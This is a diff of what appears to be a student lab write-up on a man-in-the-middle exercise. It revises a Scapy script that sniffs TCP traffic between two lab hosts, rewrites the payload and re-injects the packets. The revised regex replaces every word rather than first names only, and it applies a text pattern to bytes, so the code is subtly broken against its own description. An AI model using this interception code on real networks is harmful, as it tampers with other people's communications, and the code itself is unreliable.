@@ -333,59 +333,48 @@ To modify the previous script to replace every occurrence of a first name in the
 ```
 #!/usr/bin/env python3
 from scapy.all import *
+import re
 
-print ("Nigel will be removed as the first name")
-
-# Define the IP addresses and MAC addresses for Hosts A, B and M
 IP_A = "10.9.0.5"
 MAC_A = "02:42:0a:09:00:05"
 IP_B = "10.9.0.6"
 MAC_B = "02:42:0a:09:00:06"
-IP_M = "10.9.0.10"
-MAC_M = "02:42:0a:09:00:10"
-
-# Define the first name to be replaced with a sequence of A's
-firstname = "Nigel"
-
-def replace_firstname(data):
-    """
-    Replaces every occurrence of the first name with a sequence of A's
-    in the given data and returns the modified data.
-    """
-    modified_data = data.replace(firstname, 'A' * len(firstname))
-    return modified_data
 
 def spoof_pkt(pkt):
-    """
-    Intercepts the TCP packets exchanged between Host A and Host B communicating via netcat,
-    replaces every occurrence of the first name with a sequence of A's, and forwards the
-    modified packets to the destination.
-    """
-    if pkt.haslayer(TCP):
-        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 9090:
-            # Create a new packet based on the captured one.
-            newpkt = IP(bytes(pkt[IP]))
-            del newpkt.chksum
-            del newpkt[TCP].chksum
-            # Replace every occurrence of the first name with a sequence of A's.
-            newdata = replace_firstname(pkt[TCP].payload.load)
-            # Send the modified packet to Host B.
-            send(newpkt/TCP(newdata))
-        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 9090:
-            # Create a new packet based on the captured one.
-            newpkt = IP(bytes(pkt[IP]))
-            del newpkt.chksum
-            del newpkt[TCP].chksum
-            # Send the packet to Host A without making any change.
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        # Create a new packet based on the captured one.
+        # 1) We need to delete the checksum in the IP & TCP headers,
+        # because our modification will make them invalid.
+        # Scapy will recalculate them if these fields are missing.
+        # 2) We also delete the original TCP payload.
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
+        #################################################################
+        # Construct the new payload based on the old payload.
+        if pkt[TCP].payload:
+            data = pkt[TCP].payload.load  # The original payload data
+            # Replace first names with a sequence of A's
+            newdata = re.sub(r'\b([A-Za-z]+)\b', lambda match: 'A' * len(match.group(1)), data)
+            send(newpkt/newdata)
+        else:
             send(newpkt)
+        ################################################################
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+        # Create new packet based on the captured one
+        # Do not make any change
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].chksum)
+        send(newpkt)
 
-# Start sniffing the network traffic on the interface eth0.
-sniff(filter="tcp and host " + IP_A + " and host " + IP_B, prn=spoof_pkt, iface="eth0")
+f = 'tcp and (host ' + IP_A + ' or host ' + IP_B + ')'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
 ```
 
-In this modified script, I first define the IP addresses and MAC addresses for Hosts A, B and M. <br/>
-We also define the first name to be replaced with a sequence of A's. <br/>
+In the modified script, the re module is imported to perform regular expression matching for replacing first names with A's. The ```spoof_pkt()``` function is modified to use a regular expression to find and replace first names with A's of the same length, using the ```re.sub()``` function. The f variable is modified to filter for TCP packets with either Host A or Host B as the source or destination address.<br/>
 <br/>
-The ```replace_firstname``` function takes the original data as input and replaces every occurrence of the first name with a sequence of A's of the same length. The ```spoof_pkt``` function intercepts the TCP packets exchanged between Host A and Host B communicating via netcat, replaces every occurrence of the first name with a sequence of A's, and forwards the modified packets to the destination. The ```sniff``` function is used to start sniffing the network traffic on the interface ```eth0```, and calls the ```spoof_pkt``` function for each intercepted packet that matches the specified filter.
+In earlier tests, the ```replace_firstname``` function aimed to take the original data as input and replaces every occurrence of the first name with a sequence of A's of the same length. The ```spoof_pkt``` function would then attempt to intercept those TCP packets exchanged between Host A and Host B communicating via netcat, replacing every occurrence of the first name with a sequence of A's, and forwards the modified packets to the destination. The ```sniff``` function can then be used to start sniffing the network traffic on the interface ```eth0```, and calls the ```spoof_pkt``` function for each intercepted packet that matches the specified filter.
 
 ![netcat](https://user-images.githubusercontent.com/126002808/220471819-bedaa5cd-f555-469a-8801-3cb68b9293fe.png)
